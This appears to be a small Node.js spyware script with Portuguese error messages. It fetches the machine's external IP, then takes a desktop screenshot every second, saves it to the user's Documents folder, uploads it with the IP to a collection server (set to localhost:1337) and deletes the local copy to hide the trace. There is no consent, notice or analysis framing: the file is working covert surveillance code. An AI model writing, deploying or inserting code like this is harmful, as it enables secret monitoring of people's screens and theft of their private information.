const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const screenshot = require('screenshot-desktop');

async function getIp() {
    try {
        const response = await axios.get('https://www.myexternalip.com/raw');
        return response.data.trim();
    } catch (error) {
        console.error('Erro ao obter IP:', error);
        return null;
    }
}

async function captureAndSendScreenshot() {
    const ip = await getIp();
    if (!ip) {
        console.error('IP não pôde ser obtido.');
        return;
    }

    const serverUrl = 'http://localhost:1337/upload';
    const screenshotPath = path.join(process.env.USERPROFILE, 'Documents', 'screenshot.png');

    try {
        await screenshot({ filename: screenshotPath });
        const formData = new FormData();
        formData.append('screenshot', fs.createReadStream(screenshotPath), 'screenshot.png');
        formData.append('ip', ip);

        await axios.post(serverUrl, formData, {
            headers: formData.getHeaders()
        });

        fs.unlinkSync(screenshotPath);
    } catch (error) {
        console.error('Erro ao capturar ou enviar screenshot:', error);
    }
}

setInterval(captureAndSendScreenshot, 1000);